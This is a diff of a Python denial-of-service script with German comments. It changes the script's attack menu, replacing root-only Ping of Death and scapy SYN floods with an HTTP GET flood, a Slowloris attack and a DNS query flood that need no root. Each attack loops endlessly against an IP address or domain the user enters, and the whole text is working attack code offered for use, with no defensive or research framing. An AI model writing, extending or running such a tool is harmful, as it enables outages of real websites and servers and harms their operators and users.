@@ -2,14 +2,9 @@
 import os
 import socket
 import random
+import requests
 from datetime import datetime
-import subprocess
-from scapy.all import *
-
-# Root-Rechte prüfen
-if os.geteuid() != 0:
-    print("Dieses Skript erfordert Root-Rechte. Bitte starte es mit 'sudo' oder 'tsu'.")
-    exit(1)
+import threading
 
 # Begrüßung
 os.system("clear")
@@ -20,11 +15,14 @@ print("1 - UDP Flood")
 print("2 - TCP Flood")
 print("3 - POD Flood (Ping of Death)")
 print("4 - SYN Flood")
+print("5 - HTTP GET Flood (rootfrei)")
+print("6 - Slowloris Attack (rootfrei)")
+print("7 - DNS Query Flood (rootfrei)")
 
 # Auswahl der Methode
-method = input("Wähle die Angriffsmethode (1/2/3/4): ")
-ip = input("Ziel-IP-Adresse: ")
-port = int(input("Port (nur für UDP und TCP relevant, z. B. 80): "))
+method = input("Wähle die Angriffsmethode (1/2/3/4/5/6/7): ")
+ip = input("Ziel-IP-Adresse (oder Domain für HTTP/DNS): ")
+port = int(input("Port (nur für UDP, TCP, SYN relevant, z. B. 80): "))
 
 # UDP Flood
 if method == "1":
@@ -61,32 +59,62 @@ elif method == "2":
     except KeyboardInterrupt:
         print("TCP-Flood beendet.")
 
-# Ping of Death (POD Flood)
-elif method == "3":
-    def ping_of_death(ip):
-        print("Starte Ping of Death...")
+# HTTP GET Flood
+elif method == "5":
+    def http_get_flood(target):
+        print("Starte HTTP GET Flood...")
         try:
             while True:
-                subprocess.run(["ping", "-s", "65507", ip], check=True)
+                response = requests.get(target)
+                print(f"HTTP GET gesendet an {target} - Statuscode: {response.status_code}")
         except KeyboardInterrupt:
-            print("Ping of Death beendet.")
+            print("HTTP GET Flood beendet.")
+        except Exception as e:
+            print(f"Fehler: {e}")
 
-    ping_of_death(ip)
+    target_url = f"http://{ip}"
+    http_get_flood(target_url)
 
-# SYN Flood
-elif method == "4":
-    def syn_flood(ip, port):
-        print("Starte SYN-Flood...")
+# Slowloris Attack
+elif method == "6":
+    def slowloris(ip, port):
+        print("Starte Slowloris...")
+        sockets = []
+        try:
+            for _ in range(100):  # Erstelle 100 Verbindungen
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(5)
+                sock.connect((ip, port))
+                sock.send(b"GET / HTTP/1.1\r\n")
+                sockets.append(sock)
+                print(f"Verbindung {len(sockets)} offen gehalten.")
+            while True:
+                for sock in sockets:
+                    sock.send(b"X-a: Keep-alive\r\n")  # Halte Verbindung offen
+        except KeyboardInterrupt:
+            print("Slowloris beendet.")
+        except Exception as e:
+            print(f"Fehler: {e}")
+
+    slowloris(ip, port)
+
+# DNS Query Flood
+elif method == "7":
+    def dns_flood(ip):
+        print("Starte DNS Query Flood...")
+        server = (ip, 53)  # Port 53 ist für DNS
+        query = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"  # DNS-Anfrage
         try:
             while True:
-                ip_layer = IP(dst=ip)
-                tcp_layer = TCP(sport=RandShort(), dport=port, flags="S")
-                packet = ip_layer / tcp_layer
-                send(packet, verbose=False)
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.sendto(query, server)
+                print("DNS-Anfrage gesendet.")
         except KeyboardInterrupt:
-            print("SYN-Flood beendet.")
+            print("DNS Query Flood beendet.")
+        except Exception as e:
+            print(f"Fehler: {e}")
 
-    syn_flood(ip, port)
+    dns_flood(ip)
 
 else:
     print("Ungültige Auswahl. Das Programm wird beendet.")
